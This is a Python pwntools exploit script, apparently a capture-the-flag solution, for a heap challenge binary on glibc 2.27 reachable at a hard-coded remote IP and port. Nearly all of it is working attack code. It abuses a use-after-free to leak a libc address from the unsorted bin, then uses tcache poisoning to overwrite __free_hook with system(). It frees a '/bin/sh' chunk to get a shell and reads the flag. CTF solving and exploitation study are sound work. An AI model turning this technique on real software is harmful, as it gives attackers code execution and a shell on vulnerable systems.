#!/usr/bin/env python

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

TARGET = './chall_patched'
HOST = '167.71.200.118'
PORT = 1337

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

#context.log_level = 'DEBUG'
gdb_script = f"""
    break *main
    b *malloc
    b *free
"""
# gdb.attach(p, gdbscript=gdb_script)

# ===================================== #

def malloc(idx, size, payload):
    p.sendlineafter(b"> ", b'1')                        # malloc()
    p.sendlineafter(b"Index : ", str(idx).encode())     # index
    p.sendlineafter(b"Size : ", str(size).encode())     # size
    p.sendlineafter(b"data : ", payload)                # payload

def free(idx):
    p.sendlineafter(b"> ", b'2')                        # free()
    p.sendlineafter(b"Index : ", str(idx).encode())     # index

def edit(idx, content):
    p.sendlineafter(b"", b'3')                          # edit()
    p.sendlineafter(b"Index : ", str(idx).encode())     # index
    p.sendlineafter(b"Edit data : ", content)           # content/payload

def view(idx):
    p.sendlineafter(b"> ", b'4')                        # view()
    p.sendlineafter(b"Index : ", str(idx).encode())     # index

    #view = p.recvuntil(b"You ")[:-5]
    view = p.recvline()[:6]
    print(f"view : {view}")

    return view

# Some offsets #
system_offset = libc.symbols['system']
free_hook_offset = libc.symbols['__free_hook']
#log.info(f"system offst : {hex(system_offset)}")
#log.info(f"free_hook offst : {hex(free_hook_offset)}")


# Step-by-step #

# Allocate 2 chunk (1st chunk will go to unsortedbin, 2nd will act as a barrier so the 1st chunk doesn't consolidate/merge with 'top chunk'/'wilderness') #
malloc(0, 1056, b'This will go to unsortedbin')         # When freed this will be stored in 'unsortedbin', from here we can leak glibc (main_arena+96).
malloc(1, 24, b'Temp Barrier')                          # Act like a temporary 'barrier' so unsortedbin will not merge with top chunk.


# Free idx 0 so it goes to unsortedbin #
free(0)


# Read contents of freed unsortedbin (idx 0) #
mainarena_96_addr= u64(view(0).ljust(8, b'\x00'))
log.info(f"leaked main_arena+96 :  {hex(mainarena_96_addr)}")

libc_base_addr = mainarena_96_addr - 0x3ebca0           # libc_base = main_arena+96 offset - libc current_base = 0x3ebca0
free_hook = libc_base_addr + free_hook_offset
system = libc_base_addr + system_offset
log.info(f"libc base : {hex(libc_base_addr)}")
log.info(f"free_hook : {hex(free_hook)}")
log.info(f"system()  : {hex(system)}")

# Overwrite __free_hook with system()
malloc(2, 24, b'blabla')                    # dummy chunk so tcache's counter doesn't go to 0.
malloc(3, 24, b'put free_hook on edit 3')
free(2)
free(3)
edit(3, p64(free_hook))

malloc(4, 24, b'/bin/sh')
malloc(5, 24, p64(system))


# Pop a shell with /bin/sh string from malloc(4)
free(4)
p.sendline(b'cat flag*')


p.interactive()
p.close()

# NOTE:
# UAF
# Unsortedbin leak
# Tcache Poisoning
